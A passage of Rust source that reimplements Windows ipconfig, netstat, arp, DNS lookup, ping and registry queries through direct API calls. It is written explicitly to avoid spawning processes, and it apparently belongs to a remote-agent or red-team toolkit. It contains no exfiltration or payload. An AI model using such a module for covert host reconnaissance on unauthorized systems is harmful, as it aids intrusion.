// inline_network.rs — Network commands (Inline Windows APIs — NO process spawn)
//
// Uses direct Windows API calls via FFI:
//   - GetAdaptersAddresses  → ipconfig
//   - GetExtendedTcpTable   → netstat TCP
//   - GetExtendedUdpTable   → netstat UDP
//   - GetIpNetTable        → ARP table
//   - std::net::ToSocketAddrs → DNS lookup
//   - IcmpSendEcho         → ping

use std::net::ToSocketAddrs;

// ============================================================
// Windows API Constants
// ============================================================

const AF_UNSPEC: u32 = 0;
const AF_INET: u32 = 2;

const GAA_FLAG_SKIP_ANYCAST: u32 = 0x04;
const GAA_FLAG_SKIP_MULTICAST: u32 = 0x08;
const GAA_FLAG_SKIP_UNICAST: u32 = 0x02;
const GAA_FLAG_SKIP_FRIENDLY_NAME: u32 = 0x20;

const TCP_TABLE_OWNER_PID_ALL: u32 = 5;
const UDP_TABLE_OWNER_PID: u32 = 1;

// TCP states
const MIB_TCP_STATE_CLOSED: u32 = 1;
const MIB_TCP_STATE_LISTEN: u32 = 2;
const MIB_TCP_STATE_SYN_SENT: u32 = 3;
const MIB_TCP_STATE_SYN_RCVD: u32 = 4;
const MIB_TCP_STATE_ESTAB: u32 = 5;
const MIB_TCP_STATE_FIN_WAIT1: u32 = 6;
const MIB_TCP_STATE_FIN_WAIT2: u32 = 7;
const MIB_TCP_STATE_CLOSE_WAIT: u32 = 8;
const MIB_TCP_STATE_CLOSING: u32 = 9;
const MIB_TCP_STATE_LAST_ACK: u32 = 10;
const MIB_TCP_STATE_TIME_WAIT: u32 = 11;
const MIB_TCP_STATE_DELETE_TCB: u32 = 12;

fn tcp_state_name(state: u32) -> &'static str {
    match state {
        MIB_TCP_STATE_CLOSED     => "CLOSED",
        MIB_TCP_STATE_LISTEN     => "LISTENING",
        MIB_TCP_STATE_SYN_SENT   => "SYN_SENT",
        MIB_TCP_STATE_SYN_RCVD   => "SYN_RCVD",
        MIB_TCP_STATE_ESTAB      => "ESTABLISHED",
        MIB_TCP_STATE_FIN_WAIT1  => "FIN_WAIT1",
        MIB_TCP_STATE_FIN_WAIT2  => "FIN_WAIT2",
        MIB_TCP_STATE_CLOSE_WAIT => "CLOSE_WAIT",
        MIB_TCP_STATE_CLOSING    => "CLOSING",
        MIB_TCP_STATE_LAST_ACK   => "LAST_ACK",
        MIB_TCP_STATE_TIME_WAIT  => "TIME_WAIT",
        MIB_TCP_STATE_DELETE_TCB => "DELETE_TCB",
        _ => "UNKNOWN",
    }
}

// ============================================================
// FFI declarations — Windows API
// ============================================================

#[cfg(target_os = "windows")]
extern "system" {
    // iphlpapi.dll
    fn GetAdaptersAddresses(
        family: u32, flags: u32, reserved: *mut std::ffi::c_void,
        buffer: *mut u8, size: *mut u32,
    ) -> u32;
    fn GetExtendedTcpTable(
        table: *mut u8, size: *mut u32, order: i32,
        af: u32, class: u32, reserved: u32,
    ) -> u32;
    fn GetExtendedUdpTable(
        table: *mut u8, size: *mut u32, order: i32,
        af: u32, class: u32, reserved: u32,
    ) -> u32;
    fn GetIpNetTable(
        table: *mut u8, size: *mut u32, order: i32,
    ) -> u32;
    // icmp.dll
    fn IcmpSendEcho(
        handle: *mut std::ffi::c_void,
        dest: u32, request_data: *mut u8, request_size: u16,
        opt: *mut std::ffi::c_void, reply_buf: *mut u8, reply_size: u32,
        timeout: u32,
    ) -> u32;
    fn IcmpCreateFile() -> *mut std::ffi::c_void;
    // BUGFIX: added IcmpCloseHandle declaration. The handle returned by
    // IcmpCreateFile was being leaked (called once per ping command).
    fn IcmpCloseHandle(handle: *mut std::ffi::c_void) -> i32;
}

// ============================================================
// Helper functions
// ============================================================

fn uint32_to_ip(addr: u32) -> String {
    // BUGFIX: addr is in NETWORK byte order (Windows convention).
    // For IP 192.168.1.1, dwLocalAddr = 0x0101A8C0 on little-endian x86/x64
    // because Windows stores the first octet at the lowest memory address.
    // The previous code reversed the octets, printing 1.1.168.192 instead of 192.168.1.1.
    format!("{}.{}.{}.{}",
        addr & 0xFF,
        (addr >> 8) & 0xFF,
        (addr >> 16) & 0xFF,
        (addr >> 24) & 0xFF
    )
}

fn ntohs(port: u32) -> u16 {
    ((port & 0xFF) as u16) << 8 | ((port >> 8) & 0xFF) as u16
}

#[cfg(target_os = "windows")]
fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
fn from_wide(ptr: *const u16) -> String {
    if ptr.is_null() { return String::new(); }
    let mut len = 0usize;
    unsafe {
        while *ptr.add(len) != 0 {
            len += 1;
            if len > 512 { break; }
        }
    }
    String::from_utf16_lossy(unsafe { std::slice::from_raw_parts(ptr, len) })
}

// ============================================================
// ipconfig — Network adapter configuration
// Uses GetAdaptersAddresses + net::interface (no process spawn)
// ============================================================

pub fn ipconfig(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("ipconfig: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        let mut out = String::new();
        out.push_str("Windows IP Configuration\n\n");

        let adapters_list = get_adapters_list();
        if let Some(adapters) = &adapters_list {
            for a in adapters {
                // Adapter type header — matches real ipconfig style
                let type_label = match a.if_type {
                    6  => "Ethernet adapter",
                    71 => "Wireless LAN adapter",
                    23 => "PPP adapter",
                    24 => "Loopback adapter",
                    _  => "adapter",
                };
                out.push_str(&format!("{} {}:\n", type_label, a.name));

                // Connection status
                let media_state = if a.oper_status == 1 {
                    "Media State . . . . . . . . . . . : Media connected"
                } else {
                    "Media State . . . . . . . . . . . : Media disconnected"
                };
                out.push_str(&format!("{}\n", media_state));

                // DNS Suffix
                out.push_str(&format!(
                    "   Connection-specific DNS Suffix  . : {}\n",
                    if a.dns_suffix_str.is_empty() { "".to_string() } else { a.dns_suffix_str.clone() }
                ));

                // IPv6
                if !a.ipv6.is_empty() {
                    out.push_str(&format!(
                        "   Link-local IPv6 Address . . . . . : {}%{}\n",
                        a.ipv6, a.index
                    ));
                }

                // IPv4
                if !a.ip.is_empty() {
                    out.push_str(&format!(
                        "   IPv4 Address. . . . . . . . . . . : {}\n", a.ip
                    ));
                }

                out.push_str("\n");
            }
        } else {
            out.push_str("(get_adapters_addresses failed)\n");
        }

        (out, String::new())
    }
}

// Adapter info struct (output only)
struct AdapterInfo {
    index: u32,
    name: String,
    mac: String,
    ip: String,
    ipv6: String,
    mtu: u32,
    if_type: u32,
    oper_status: u32,
    dns_suffix_str: String,
}

// ============================================================
// get_adapters_list — reads IP_ADAPTER_ADDRESSES_LH via raw byte offsets.
//
// WHY RAW OFFSETS INSTEAD OF #[repr(C)] STRUCT:
// The Windows SDK IP_ADAPTER_ADDRESSES_LH layout (x64) has:
//   0x00  u32 Length
//   0x04  u32 IfIndex
//   0x08  *Next                    (8 bytes)
//   0x10  *AdapterName (PSTR ANSI) (8 bytes)  ← ANSI GUID, not friendly!
//   0x18  *FirstUnicastAddress     (8 bytes)
//   0x20  *FirstAnycastAddress     (8 bytes)
//   0x28  *FirstMulticastAddress   (8 bytes)
//   0x30  *FirstDnsServerAddress   (8 bytes)
//   0x38  *DnsSuffix  (PWSTR)      (8 bytes)
//   0x40  *Description (PWSTR)     (8 bytes)
//   0x48  *FriendlyName (PWSTR)    (8 bytes)  ← THIS is the display name
//   0x50  PhysicalAddress[8]       (8 bytes)
//   0x58  PhysicalAddressLength u32
//   0x5C  Flags u32
//   0x60  Mtu u32
//   0x64  IfType u32
//   0x68  OperStatus u32
// ============================================================

#[cfg(target_os = "windows")]
fn get_adapters_list() -> Option<Vec<AdapterInfo>> {
    let mut buf_size: u32 = 32768;
    let mut buf = vec![0u8; buf_size as usize];
    // Skip anycast+multicast, keep unicast+friendly name+dns
    let gaa_flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;

    let rc = unsafe {
        GetAdaptersAddresses(AF_UNSPEC, gaa_flags, std::ptr::null_mut(),
            buf.as_mut_ptr(), &mut buf_size)
    };
    if rc == 111 {
        // ERROR_BUFFER_OVERFLOW — retry with correct size
        buf = vec![0u8; buf_size as usize];
        let rc2 = unsafe {
            GetAdaptersAddresses(AF_UNSPEC, gaa_flags, std::ptr::null_mut(),
                buf.as_mut_ptr(), &mut buf_size)
        };
        if rc2 != 0 { return None; }
    } else if rc != 0 { return None; }

    let buf_start = buf.as_ptr() as usize;
    let buf_end   = buf_start + buf.len();
    let mut adapters = Vec::new();

    // cur = pointer to first IP_ADAPTER_ADDRESSES_LH record
    let mut cur_ptr = buf.as_ptr() as usize;

    for _ in 0..64 {
        if cur_ptr < buf_start || cur_ptr + 0x70 > buf_end { break; }
        let p = cur_ptr as *const u8;

        // Read all fields by offset — immune to struct padding issues
        let _length       = unsafe { *(p as *const u32) };          // reserved, not used
        let if_index      = unsafe { *(p.add(0x04) as *const u32) };
        let next_ptr      = unsafe { *(p.add(0x08) as *const usize) };

        // 0x10 = AdapterName (PSTR — ANSI GUID like "{4D36E972-...}")
        // 0x38 = DnsSuffix   (PWSTR — e.g. "Wi-Fi")
        // 0x40 = Description (PWSTR — e.g. "Intel(R) Wi-Fi 6 AX201")
        // 0x48 = FriendlyName(PWSTR — e.g. "Wi-Fi", "Ethernet 2")  ← USE THIS
        let dns_suffix_ptr  = unsafe { *(p.add(0x38) as *const usize) };
        let description_ptr = unsafe { *(p.add(0x40) as *const usize) };
        let friendly_ptr    = unsafe { *(p.add(0x48) as *const usize) };

        // 0x18 = *FirstUnicastAddress
        let unicast_ptr = unsafe { *(p.add(0x18) as *const usize) };

        // 0x50 = PhysicalAddress[8], 0x58 = PhysicalAddressLength
        let mac_bytes   = unsafe { std::slice::from_raw_parts(p.add(0x50), 8) };
        let mac_len     = unsafe { *(p.add(0x58) as *const u32) } as usize;

        let mtu         = unsafe { *(p.add(0x60) as *const u32) };
        let if_type     = unsafe { *(p.add(0x64) as *const u32) };
        let oper_status = unsafe { *(p.add(0x68) as *const u32) };

        // ── FriendlyName — UTF-16 string ──────────────────────────────
        // Prefer FriendlyName (0x48); fall back to Description (0x40)
        let name = if friendly_ptr != 0 {
            read_wstr_safe(friendly_ptr)
        } else if description_ptr != 0 {
            read_wstr_safe(description_ptr)
        } else {
            format!("if{}", if_index)
        };

        // ── DNS Suffix ────────────────────────────────────────────────
        let dns_str = if dns_suffix_ptr != 0 {
            read_wstr_safe(dns_suffix_ptr)
        } else { String::new() };

        // ── MAC address ───────────────────────────────────────────────
        let mac = if mac_len > 0 && mac_len <= 8 {
            mac_bytes[..mac_len].iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>().join("-")
        } else { String::new() };

        // ── Walk unicast list → IPv4 + IPv6 ───────────────────────────
        let mut ipv4 = String::new();
        let mut ipv6 = String::new();

        // IP_ADAPTER_UNICAST_ADDRESS_LH:
        //   0x00 Length(4) + Flags(4)
        //   0x08 *Next (8)
        //   0x10 *lpSockaddr (8)  ← SOCKET_ADDRESS.lpSockaddr
        //   0x18 iSockaddrLength (4)
        let mut ua_ptr = unicast_ptr;
        for _ in 0..32 {
            if ua_ptr == 0 || ua_ptr < buf_start || ua_ptr + 0x20 > buf_end { break; }
            let ua = ua_ptr as *const u8;
            let sa_ptr  = unsafe { *(ua.add(0x10) as *const usize) };
            let sa_len  = unsafe { *(ua.add(0x18) as *const i32) };
            let next_ua = unsafe { *(ua.add(0x08) as *const usize) };

            if sa_ptr != 0 && sa_len >= 16 {
                let sa = sa_ptr as *const u8;
                let family = unsafe { *(sa as *const u16) };
                if family == 2 && ipv4.is_empty() && sa_len >= 16 {
                    // SOCKADDR_IN: family(2) + port(2) + addr(4)
                    let b = unsafe { std::slice::from_raw_parts(sa.add(4), 4) };
                    ipv4 = format!("{}.{}.{}.{}", b[0], b[1], b[2], b[3]);
                } else if family == 23 && ipv6.is_empty() && sa_len >= 28 {
                    // SOCKADDR_IN6: family(2)+port(2)+flowinfo(4)+addr(16)
                    let b = unsafe { std::slice::from_raw_parts(sa.add(8), 16) };
                    let parts: Vec<String> = (0..8)
                        .map(|i| format!("{:x}", ((b[i*2] as u16) << 8) | b[i*2+1] as u16))
                        .collect();
                    ipv6 = parts.join(":");
                }
            }
            ua_ptr = next_ua;
        }

        adapters.push(AdapterInfo {
            index: if_index,
            name,
            mac,
            ip: ipv4,
            ipv6,
            mtu,
            if_type,
            oper_status,
            dns_suffix_str: dns_str,
        });

        if next_ptr == 0 { break; }
        cur_ptr = next_ptr;
    }

    Some(adapters)
}

/// Read a null-terminated UTF-16 string from any valid Windows heap pointer.
/// Capped at 256 UTF-16 code units — safe even for Windows-heap-allocated strings
/// that live outside the GetAdaptersAddresses buffer (FriendlyName, NetAPI strings etc).
/// Returns empty String if ptr == 0.
#[cfg(target_os = "windows")]
fn read_wstr_safe(ptr: usize) -> String {
    if ptr == 0 { return String::new(); }
    let mut words = Vec::with_capacity(64);
    let mut i = 0usize;
    loop {
        if i >= 256 { break; }
        let w = unsafe { *((ptr + i * 2) as *const u16) };
        if w == 0 { break; }
        words.push(w);
        i += 1;
    }
    String::from_utf16_lossy(&words)
}


#[cfg(target_os = "windows")]
fn read_hosts_summary() -> Option<String> {
    let data = std::fs::read("C:\\Windows\\System32\\drivers\\etc\\hosts").ok()?;
    let mut entry_count = 0u32;
    let mut lines_out = String::new();
    for line in String::from_utf8_lossy(&data).lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
        let fields: Vec<&str> = trimmed.split_whitespace().collect();
        if fields.len() >= 2 {
            entry_count += 1;
            lines_out.push_str(&format!("  {:<20} -> {}\n", fields[0], fields[1..].join(" ")));
        }
    }
    if entry_count == 0 { return None; }
    Some(format!("{} entries\n{}", entry_count, lines_out))
}

fn truncate_str(s: &str, max: usize) -> String {
    // BUGFIX: the previous &s[..max-3] panics if `max-3` falls in the middle
    // of a multi-byte UTF-8 character (e.g. CJK adapter names like 'Wi-Fi 卡').
    // We now walk back to the nearest UTF-8 char boundary.
    if s.len() <= max { return s.to_string(); }
    if max < 3 { return s.to_string(); } // too small to safely fit ellipsis
    let mut end = max - 3;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    if end == 0 { s.to_string() }
    else { format!("{}...", &s[..end]) }
}

// ============================================================
// netstat — Active connections
// Uses GetExtendedTcpTable + GetExtendedUdpTable
// ============================================================

pub fn netstat(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("netstat: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        let mut out = String::new();

        out.push_str(&format!(
            "{:<6}  {:<6}  {:<23}  {:<23}  {}\n",
            "PROTO", "PID", "LOCAL ADDRESS", "REMOTE ADDRESS", "STATE"
        ));
        out.push_str(&"-".repeat(80));
        out.push_str("\n");

        // TCP
        let tcp_rows = get_tcp_table();
        for r in &tcp_rows {
            let local = format!("{}:{}", uint32_to_ip(r.local_addr), ntohs(r.local_port));
            let remote = format!("{}:{}", uint32_to_ip(r.remote_addr), ntohs(r.remote_port));
            out.push_str(&format!(
                "{:<6}  {:<6}  {:<23}  {:<23}  {}\n",
                "TCP", r.pid, local, remote, tcp_state_name(r.state)
            ));
        }

        // UDP
        let udp_rows = get_udp_table();
        for r in &udp_rows {
            let local = format!("{}:{}", uint32_to_ip(r.local_addr), ntohs(r.local_port));
            out.push_str(&format!(
                "{:<6}  {:<6}  {:<23}  {:<23}  {}\n",
                "UDP", r.pid, local, "*:*", "STATELESS"
            ));
        }

        let total = tcp_rows.len() + udp_rows.len();
        out.push_str(&"-".repeat(80));
        out.push_str("\n");
        out.push_str(&format!(
            "Total: {} connections ({} TCP, {} UDP)\n",
            total, tcp_rows.len(), udp_rows.len()
        ));
        out.push_str("\n");

        (out, String::new())
    }
}

struct TcpRow {
    state: u32, local_addr: u32, local_port: u32,
    remote_addr: u32, remote_port: u32, pid: u32,
}

struct UdpRow {
    local_addr: u32, local_port: u32, pid: u32,
}

#[cfg(target_os = "windows")]
fn get_tcp_table() -> Vec<TcpRow> {
    let mut buf_size: u32 = 65536;
    let mut buf = vec![0u8; buf_size as usize];

    let rc = unsafe {
        GetExtendedTcpTable(
            buf.as_mut_ptr(), &mut buf_size, 1,
            AF_INET, TCP_TABLE_OWNER_PID_ALL, 0,
        )
    };
    if rc != 0 { return Vec::new(); }

    let num_entries = unsafe { *(buf.as_ptr() as *const u32) };
    let mut rows = Vec::new();
    let row_size: usize = 24; // MIB_TCPROW_OWNER_PID = 6 x u32

    for i in 0..num_entries as usize {
        let offset = 4 + i * row_size;
        if offset + row_size > buf.len() { break; }
        let p = unsafe { buf.as_ptr().add(offset) };
        rows.push(TcpRow {
            state:       unsafe { *(p as *const u32) },
            local_addr:  unsafe { *(p.add(4) as *const u32) },
            local_port:  unsafe { *(p.add(8) as *const u32) },
            remote_addr: unsafe { *(p.add(12) as *const u32) },
            remote_port: unsafe { *(p.add(16) as *const u32) },
            pid:         unsafe { *(p.add(20) as *const u32) },
        });
    }
    rows
}

#[cfg(target_os = "windows")]
fn get_udp_table() -> Vec<UdpRow> {
    let mut buf_size: u32 = 65536;
    let mut buf = vec![0u8; buf_size as usize];

    let rc = unsafe {
        GetExtendedUdpTable(
            buf.as_mut_ptr(), &mut buf_size, 1,
            AF_INET, UDP_TABLE_OWNER_PID, 0,
        )
    };
    if rc != 0 { return Vec::new(); }

    let num_entries = unsafe { *(buf.as_ptr() as *const u32) };
    let mut rows = Vec::new();
    let row_size: usize = 12; // MIB_UDPROW_OWNER_PID = 3 x u32

    for i in 0..num_entries as usize {
        let offset = 4 + i * row_size;
        if offset + row_size > buf.len() { break; }
        let p = unsafe { buf.as_ptr().add(offset) };
        rows.push(UdpRow {
            local_addr: unsafe { *(p as *const u32) },
            local_port: unsafe { *(p.add(4) as *const u32) },
            pid:         unsafe { *(p.add(8) as *const u32) },
        });
    }
    rows
}

// ============================================================
// arp — ARP table using GetIpNetTable
// ============================================================

pub fn arp(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("arp: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        let mut buf_size: u32 = 65536;
        let mut buf = vec![0u8; buf_size as usize];

        let rc = unsafe {
            GetIpNetTable(buf.as_mut_ptr(), &mut buf_size, 1)
        };

        if rc != 0 {
            return (String::new(), format!("GetIpNetTable failed with error {}", rc));
        }

        let num_entries = unsafe { *(buf.as_ptr() as *const u32) };
        let mut out = String::new();

        out.push_str(&format!(
            "{:<6}  {:<20}  {:<24}  {}\n",
            "INDEX", "IP ADDRESS", "MAC ADDRESS", "TYPE"
        ));
        out.push_str(&"-".repeat(70));
        out.push_str("\n");

        // MIB_IPNETROW: index(4) + phys_addr_len(4) + phys_addr(8) + addr(4) + type(4) = 24
        let row_size: usize = 24;
        for i in 0..num_entries as usize {
            let offset = 4 + i * row_size;
            if offset + row_size > buf.len() { break; }
            let p = unsafe { buf.as_ptr().add(offset) };
            let index = unsafe { *(p as *const u32) };
            let pa_len = unsafe { *(p.add(4) as *const u32) };
            let pa_ptr = unsafe { p.add(8) };
            let addr = unsafe { *(p.add(16) as *const u32) };
            let atype = unsafe { *(p.add(20) as *const u32) };

            let mac = if pa_len > 0 && pa_len <= 8 {
                let bytes = unsafe { std::slice::from_raw_parts(pa_ptr, pa_len as usize) };
                bytes.iter().map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join("-")
            } else {
                "ff-ff-ff-ff-ff-ff".into()
            };

            let type_str = match atype {
                1 => "dynamic",
                2 => "static",
                3 => "invalid",
                _ => "other",
            };

            out.push_str(&format!(
                "{:<6}  {:<20}  {:<24}  {}\n",
                index, uint32_to_ip(addr), mac, type_str
            ));
        }

        out.push_str(&"-".repeat(70));
        out.push_str("\n");
        (out, String::new())
    }
}

// ============================================================
// dns — DNS lookup using std::net
// ============================================================

pub fn dns(args: &str) -> (String, String) {
    let hostname = args.trim();
    if hostname.is_empty() {
        return (String::new(), "dns: hostname required (usage: dns <hostname>)".into());
    }

    let mut out = String::new();
    out.push_str(&format!("  DNS Lookup: {}\n", hostname));
    out.push_str("  ");
    out.push_str(&"-".repeat(50));
    out.push_str("\n");

    match format!("{}:0", hostname).to_socket_addrs() {
        Ok(addrs) => {
            let mut found = false;
            for addr in addrs {
                let ip = addr.ip();
                let record_type = if ip.is_ipv4() { "A Record " } else { "AAAA Record" };
                out.push_str(&format!("  {:<14}: {}\n", record_type, ip));
                found = true;
            }
            if !found {
                out.push_str("  No records found\n");
            }
        }
        Err(e) => {
            return (String::new(), format!("dns: failed to resolve '{}': {}", hostname, e));
        }
    }

    (out, String::new())
}

// ============================================================
// ping — ICMP ping using IcmpSendEcho
// ============================================================

pub fn ping(args: &str) -> (String, String) {
    let target = args.trim();
    if target.is_empty() {
        return (String::new(), "ping: hostname or IP required (usage: ping <target>)".into());
    }

    #[cfg(not(target_os = "windows"))]
    { return (String::new(), "ping: windows only".into()); }

    #[cfg(target_os = "windows")]
    {
        // Resolve target to IP
        let addr_u32 = match target.parse::<std::net::IpAddr>() {
            Ok(std::net::IpAddr::V4(v4)) => {
                let octets = v4.octets();
                // BUGFIX: IcmpSendEcho expects DestinationAddress in NETWORK byte order
                // (same as IN_ADDR.S_addr). The previous code computed host byte order
                // (0xC0A80101 for 192.168.1.1), causing pings to be sent to the wrong IP.
                u32::from_le_bytes([octets[0], octets[1], octets[2], octets[3]])
            }
            Ok(std::net::IpAddr::V6(_)) => {
                return (String::new(), "ping: IPv6 not supported (use IPv4 address)".into());
            }
            Err(_) => {
                // Try DNS resolution
                match format!("{}:0", target).to_socket_addrs() {
                    Ok(addrs) => {
                        let mut resolved = None;
                        for addr in addrs {
                            if let std::net::IpAddr::V4(v4) = addr.ip() {
                                let o = v4.octets();
                                // BUGFIX: same network-byte-order fix as above.
                                resolved = Some(u32::from_le_bytes([o[0], o[1], o[2], o[3]]));
                                break;
                            }
                        }
                        match resolved {
                            Some(ip) => ip,
                            None => return (String::new(), format!("ping: cannot resolve '{}'", target)),
                        }
                    }
                    Err(_) => return (String::new(), format!("ping: cannot resolve '{}'", target)),
                }
            }
        };

        let handle = unsafe { IcmpCreateFile() };
        if handle.is_null() {
            return (String::new(), "ping: IcmpCreateFile failed".into());
        }

        let mut send_data: [u8; 32] = [0; 32];
        // Fill with 'abcdefgh...' pattern like Windows ping
        for (i, b) in send_data.iter_mut().enumerate() {
            *b = b'a' + (i % 26) as u8;
        }

        let mut reply_buf = vec![0u8; 4096];

        let mut out = String::new();
        out.push_str(&format!("\nPinging {} [{}] with 32 bytes of data:\n", target, uint32_to_ip(addr_u32)));

        let mut sent = 0u32;
        let mut received = 0u32;
        let mut min_ms = u32::MAX;
        let mut max_ms = 0u32;
        let mut total_ms = 0u32;

        for _ in 0..2 {
            sent += 1;
            let rc = unsafe {
                IcmpSendEcho(
                    handle, addr_u32,
                    send_data.as_mut_ptr(), 32,
                    std::ptr::null_mut(),
                    reply_buf.as_mut_ptr(), reply_buf.len() as u32,
                    5000, // 5 second timeout
                )
            };

            if rc != 0 {
                received += 1;
                // Parse ICMP_ECHO_REPLY (x64 layout, 40 bytes total):
                //   0x00 Address           (4)
                //   0x04 Status            (4)
                //   0x08 RoundTripTime     (4)   <-- we read this
                //   0x0C DataSize          (2)
                //   0x10 Data pointer      (8)
                //   0x18 Options.Ttl       (1)   <-- we read this (offset 24)
                //
                // BUGFIX: previous code read TTL from offset 12, which is actually
                // the low byte of DataSize, not TTL. Real TTL was never displayed.
                if reply_buf.len() >= 25 {
                    let rtt = unsafe { *(reply_buf.as_ptr().add(8) as *const u32) };
                    let ttl = unsafe { *(reply_buf.as_ptr().add(24) as *const u8) };

                    out.push_str(&format!("Reply from {}: bytes=32 time={}ms TTL={}\n",
                        uint32_to_ip(addr_u32), rtt, ttl));
                    if rtt < min_ms { min_ms = rtt; }
                    if rtt > max_ms { max_ms = rtt; }
                    total_ms += rtt;
                } else {
                    out.push_str(&format!("Reply from {}: bytes=32\n", uint32_to_ip(addr_u32)));
                }
            } else {
                out.push_str("Request timed out.\n");
            }
        }

        let lost = sent - received;
        let loss_pct = if sent > 0 { (lost * 100) / sent } else { 0 };
        let avg_ms = if received > 0 { total_ms / received } else { 0 };

        out.push_str("\nPing statistics:\n");
        out.push_str(&format!("    Packets: Sent = {}, Received = {}, Lost = {} ({}% loss)\n",
            sent, received, lost, loss_pct));
        if received > 0 {
            out.push_str(&format!("Approximate round trip times:\n    Minimum = {}ms, Maximum = {}ms, Average = {}ms\n",
                min_ms, max_ms, avg_ms));
        }
        out.push_str("\n");

        // BUGFIX: release the ICMP handle to avoid leaking one per ping.
        unsafe { IcmpCloseHandle(handle); }

        (out, String::new())
    }
}

// ============================================================
// Registry, Service, Scheduled Tasks, Event Log, Net commands
// These use Windows API FFI — no process spawn
// ============================================================

pub fn reg_query(args: &str) -> (String, String) {
    let key = args.trim();
    if key.is_empty() {
        return (String::new(), "reg: key path required (usage: reg HKLM\\SOFTWARE\\...\\ValueName)".into());
    }

    #[cfg(not(target_os = "windows"))]
    { return (String::new(), "reg: windows only".into()); }

    #[cfg(target_os = "windows")]
    {
        // Parse: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion  ProgramFilesDir
        // or: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProgramFilesDir
        let (root_key, sub_key, value_name) = parse_reg_path(key);

        let hkey = match root_key.as_str() {
            "HKLM" | "HKEY_LOCAL_MACHINE" => 0x80000002usize,
            "HKCU" | "HKEY_CURRENT_USER" => 0x80000001usize,
            "HKCR" | "HKEY_CLASSES_ROOT" => 0x80000000usize,
            "HKU"  | "HKEY_USERS" => 0x80000003usize,
            "HKCC" | "HKEY_CURRENT_CONFIG" => 0x80000005usize,
            _ => return (String::new(), format!("reg: unknown root key '{}' (use HKLM, HKCU, etc.)", root_key)),
        };

        extern "system" {
            // BUGFIX: HKEY is a HANDLE (void*) = 8 bytes on x64.
            // Declaring it as u32 caused:
            //   - phkResult writes 8 bytes into a 4-byte u32 buffer -> stack corruption
            //   - returned real HKEY handles truncated when passed to subsequent calls
            //   (RegQueryValueExW, RegEnumValueW, RegCloseKey),
            //   leading to wrong-key reads or silently closing handle 0.
            fn RegOpenKeyExW(hkey: usize, subkey: *const u16, reserved: u32, access: u32, phk: *mut usize) -> i32;
            fn RegQueryValueExW(hkey: usize, name: *const u16, reserved: *mut u32, ptype: *mut u32, data: *mut u8, pdata: *mut u32) -> i32;
            fn RegCloseKey(hkey: usize) -> i32;
            fn RegEnumValueW(hkey: usize, index: u32, name: *mut u16, name_size: *mut u32, reserved: *mut u32, ptype: *mut u32, data: *mut u8, pdata: *mut u32) -> i32;
        }

        let sub_key_wide = wide(&sub_key);
        let mut hkey_out: usize = 0;

        let rc = unsafe {
            RegOpenKeyExW(hkey, sub_key_wide.as_ptr(), 0, 0x20019, &mut hkey_out) // KEY_READ
        };
        if rc != 0 {
            return (String::new(), format!("reg: cannot open key '{}' (error {})", key, rc));
        }

        let mut out = String::new();
        out.push_str(&format!("Registry: {}\\{}\n", root_key, sub_key));

        if value_name.is_empty() {
            // Enumerate all values
            let mut idx = 0u32;
            loop {
                let mut name_buf = [0u16; 256];
                let mut name_size = 256u32;
                let mut vtype: u32 = 0;
                let mut data_buf = vec![0u8; 4096];
                let mut data_size = data_buf.len() as u32;

                let rc = unsafe {
                    RegEnumValueW(hkey_out, idx, name_buf.as_mut_ptr(), &mut name_size,
                        std::ptr::null_mut(), &mut vtype, data_buf.as_mut_ptr(), &mut data_size)
                };
                if rc != 0 { break; }

                let val_name = String::from_utf16_lossy(&name_buf[..name_size as usize]);
                let _type_str = match vtype {
                    1 => "REG_SZ",
                    2 => "REG_EXPAND_SZ",
                    3 => "REG_BINARY",
                    4 => "REG_DWORD",
                    7 => "REG_MULTI_SZ",
                    _ => "OTHER",
                };

                let val_str = if vtype == 4 && data_size >= 4 {
                    let dword = unsafe { *(data_buf.as_ptr() as *const u32) };
                    format!("0x{:08X} ({})", dword, dword)
                } else if (vtype == 1 || vtype == 2) && data_size > 1 {
                    let len = (data_size as usize) / 2;
                    if len > 0 {
                        let s = String::from_utf16_lossy(
                            unsafe { std::slice::from_raw_parts(data_buf.as_ptr() as *const u16, len - 1) }
                        );
                        s
                    } else { String::new() }
                } else {
                    format!("<{} bytes>", data_size)
                };

                out.push_str(&format!("  {:<24} : {}\n", val_name, val_str));
                idx += 1;
            }
        } else {
            // Query specific value
            let name_wide = wide(&value_name);
            let mut vtype: u32 = 0;
            let mut data_buf = vec![0u8; 4096];
            let mut data_size = data_buf.len() as u32;

            let rc = unsafe {
                RegQueryValueExW(hkey_out, name_wide.as_ptr(), std::ptr::null_mut(),
                    &mut vtype, data_buf.as_mut_ptr(), &mut data_size)
            };
            if rc != 0 {
                unsafe { RegCloseKey(hkey_out); }
                return (String::new(), format!("reg: cannot query value '{}' (error {})", value_name, rc));
            }

            let val_str = if vtype == 4 && data_size >= 4 {
                let dword = unsafe { *(data_buf.as_ptr() as *const u32) };
                format!("0x{:08X} ({})", dword, dword)
            } else if (vtype == 1 || vtype == 2) && data_size > 1 {
                let len = (data_size as usize) / 2;
                if len > 0 {
                    String::from_utf16_lossy(
                        unsafe { std::slice::from_raw_parts(data_buf.as_ptr() as *const u16, len - 1) }
                    )
                } else { String::new() }
            } else {
                format!("<{} bytes, type={}>", data_size, vtype)
            };

            out.push_str(&format!("  {} : {}\n", value_name, val_str));
        }

        unsafe { RegCloseKey(hkey_out); }
        (out, String::new())
    }
}

fn parse_reg_path(path: &str) -> (String, String, String) {
    let parts: Vec<&str> = path.splitn(2, '\\').collect();
    let root = parts.get(0).unwrap_or(&"").to_string();
    if parts.len() < 2 {
        return (root, String::new(), String::new());
    }
    let rest = parts[1];
    // Check if there's a value name (last backslash-separated part)
